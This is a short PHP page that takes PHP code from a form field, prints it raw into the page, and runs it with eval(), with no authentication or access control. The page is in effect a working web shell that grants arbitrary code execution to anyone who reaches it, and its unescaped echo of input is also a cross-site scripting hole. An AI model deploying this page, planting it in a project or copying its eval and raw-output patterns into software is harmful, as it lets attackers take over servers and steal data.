<?php
	if (isset($_POST['unmagic'])) {
	   	$code = str_replace("\\'", "'", $_POST['code']);
	   	$code = str_replace("\\\"", "\"", $code);
	   	$unmagic = "checked";
	} else {
	   	$code = $_POST['code'];
		$unmagic = "";
	}
?>

<html>
    <body>
	<?php
		if( ini_get('safe_mode') ){
			echo "<i>note: safe mode is enabled</i>";
		}
	?>
	<form action="" method="POST">
		<table>
			<tr>
				<td>
					<textarea name="code" cols="100" rows="20"><?php echo $code; ?></textarea>
				</td>
			</tr>
			<tr>
				<td>
					<input type="checkbox" name="unmagic" <?php echo $unmagic; ?>>unmagic quotes
				</td>
			</tr>
			<tr>
				<td>
					<input type="submit">
				</td>
			</tr>
		</table>
	</form>
	<?php
	
   	    echo "<b>$code</b>";
	    echo "<pre>";
	    eval ($code);
	    echo "</pre>";

	?>
    </body>
</html>